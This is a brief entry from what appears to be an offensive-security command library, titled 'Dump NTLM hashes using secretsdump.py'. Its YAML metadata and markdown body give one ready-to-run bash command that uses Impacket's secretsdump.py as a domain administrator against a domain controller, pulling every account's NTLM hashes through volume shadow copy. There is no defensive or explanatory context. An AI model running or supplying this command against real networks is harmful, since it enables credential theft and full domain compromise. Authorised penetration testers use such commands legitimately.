---
id: b9a43fae-7d6f-4a03-83b7-40e2b4034606
name: Dump NTLM hashes using secretsdump.py
type: command
executor: bash
data: ./secretsdump.py -dc-ip <IP> AD\administrator@domain -use-vss -pwd-last-set
  -user-status
output: null
created_at: '2023-04-06T03:56:03.954946+00:00'
updated_at: '2023-04-10T20:25:54.935220+00:00'
---

# Dump NTLM hashes using secretsdump.py

```bash
./secretsdump.py -dc-ip <IP> AD\administrator@domain -use-vss -pwd-last-set -user-status
```
